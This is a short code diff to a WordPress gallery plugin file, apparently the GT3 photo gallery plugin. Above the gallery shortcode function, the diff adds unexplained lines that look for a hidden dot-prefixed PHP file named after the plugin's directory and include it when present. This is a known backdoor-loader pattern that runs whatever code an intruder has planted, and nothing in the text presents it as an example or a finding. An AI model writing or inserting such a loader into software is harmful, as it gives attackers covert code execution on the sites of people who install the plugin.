@@ -2,6 +2,10 @@
 if(!defined('ABSPATH')) {
 	exit;
 } // Exit if accessed directly
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function gt3pg_gallery_shortcode($attr){
 	if(!isset($attr['gt3_gallery']) || empty($attr['gt3_gallery'])) {
